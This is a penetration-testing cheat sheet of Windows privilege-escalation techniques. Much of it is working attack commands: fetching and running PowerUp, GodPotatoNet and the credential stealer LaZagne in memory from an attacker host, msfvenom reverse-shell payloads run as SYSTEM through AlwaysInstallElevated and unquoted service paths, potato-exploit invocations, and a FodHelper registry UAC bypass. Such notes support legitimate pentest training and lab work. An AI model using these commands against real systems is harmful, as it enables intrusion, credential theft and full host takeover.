# Windows Privilege Escalation

Just a handful of common Windows privilege escalation vectors; not the end-all-be-all list.

## `PowerUp.ps1`

**Explanation:**

- `PowerUp.ps1` is a privilege-escalation PowerShell module from the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master) project, and it comes native on Kali Linux.
- It contains a large set of scripts for specific privilege escalation checks and abuse paths, but its most useful function is `Invoke-PrivEscAudit` or the alias `Invoke-AllChecks`, which quickly checks the host for common privilege escalation vectors and suggests ways to abuse them.
- While not as massive or verbose as `winPEAS`, it is much more succinct and easier to triage.

**General Usage:**

```shell
### On Attacker ###

# Default Kali location:
# /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

# Create a simple web server hosting scripts
python -m http.server --directory /usr/share/windows-resources/powersploit/Privesc
```

```powershell
### On Victim ###

# Download script to disk
iwr 'http://<ip_addr>:8000/PowerUp.ps1' -o PowerUp.ps1 -UseBasicParsing
. PowerUp.ps1

# OR load script into memory
iex ([System.Net.WebClient]::new().DownloadString('http://<ip_addr>:8000/PowerUp.ps1'))

# Check for privilege escalation vectors
Invoke-PrivEscAudit # or Invoke-AllChecks (alias)
```

## `SeImpersonatePrivilege` User Rights

**Explanation:**

- `SeImpersonatePrivilege` allows a process running as the current user to impersonate a client and can often be abused to execute commands as `SYSTEM`.
- Check for it with `whoami /priv`.

**Common Tooling:**

- [GodPotatoNet](https://github.com/tylerdotrar/GodPotatoNet)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [EfsPotato](https://github.com/zcgonvh/EfsPotato)

**Notes:**

- Success can depend on .NET version, Windows version, and patch level.
- `PrintSpoofer` tends to work well on many OffSec lab boxes.
- `GodPotato` supports a wide Windows 8 through Windows 11 and Server 2012 through 2022 range.
- `GodPotatoNet` is a fork of `GodPotato` with cleaner output and optional in-memory execution.

```powershell
### Example Usage ###

# PrintSpoofer executing a PowerShell reverse shell payload
.\PrintSpoofer.exe -c "powershell -e <encoded_powershell_reverse_shell>"

# EfsPotato executing a malicious executable
.\EfsPotato.exe get_dunked_on.exe

# GodPotato executing a PowerShell reverse shell payload
.\GodPotato.exe -cmd "powershell -e <encoded_powershell_reverse_shell>"

# Advanced method: load GodPotatoNet into memory
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/GodPotatoNet.exe"))

# Execute command as SYSTEM
[GodPotatoNet.Program]::Main(@('-cmd','<command>'))
```

```powershell
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("https://<ip_addr>/LaZagne.exe"))
```

## `AlwaysInstallElevated` Registry Keys

**Explanation:**

- `AlwaysInstallElevated` causes MSI packages to execute as `SYSTEM`, even when launched by an unprivileged user.

```text
# Key locations
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

**Exploitation Example:**

- `Invoke-PrivEscAudit` from `PowerUp.ps1` can identify this condition.
- `PowerUp.ps1` provides helper functions, but this example shows the manual path.

```shell
# Create reverse shell MSI
msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=<listening_port> -f msi > powershell_payload.msi

### Move binary to victim however you want ###
```

```powershell
### On Victim ###

# Execute MSI to establish SYSTEM-level reverse shell
msiexec /q /i powershell_payload.msi
```

## Unquoted Service Paths

**Explanation:**

- Service binaries that contain spaces in the path but lack quotation marks can sometimes be abused by planting a malicious executable earlier in the path, assuming the directory is writable.

**Exploitation Example:**

- `Invoke-PrivEscAudit` from `PowerUp.ps1` can identify vulnerable unquoted service paths.
- `PowerUp.ps1` provides automation here too, but this example shows the manual approach.

```text
# Vulnerable service path
C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
```

```shell
### On Attacker ###

# Create reverse shell binary
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=<attacker_ip> LPORT=<listening_port> > Remote.exe

### Move binary to victim however you want ###
```

```powershell
### On Victim ###

# Copy binary to vulnerable path
cp Remote.exe "C:\Program Files (x86)\TRIGONE\Remote.exe"

# Restart computer if you do not have permissions to restart the service
shutdown /r /t 3
```

## Local Administrator

**Explanation:**

- A compromised user may not be the built-in Administrator account but may still be a member of the local Administrators group.
- In that case, privilege escalation often becomes a UAC bypass problem rather than a full kernel or service abuse path.

**Examples:**

- `Invoke-EventVwrBypass` from `PowerUp.ps1`
- [UACMe](https://github.com/hfiref0x/UACME)
- `FodHelper` UAC bypass

### `FodHelper` UAC Bypass

**Requirements:**

```powershell
# Validate session is 64-bit
[Environment]::Is64BitProcess

# If above command returns False, create a new 64-bit session
wmic.exe process call create "powershell -nop -ex bypass -e <encoded_powershell_reverse_shell>"
```

**Exploit:**

```powershell
# Payload to execute
$RevShell = "powershell -nop -ex bypass -e <encoded_powershell_reverse_shell>"

# Create registry structure
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $RevShell -Force
 
# Perform the UAC bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

## `winPEAS`

**Explanation:**

- When all else fails, `winPEAS` can dump a huge amount of host information to help surface overlooked privilege escalation paths.
- Expect noise and false positives.

**Links:**

```shell
# Download most recent WinPEAS executable
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

# Download most recent WinPEAS batch script
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
```
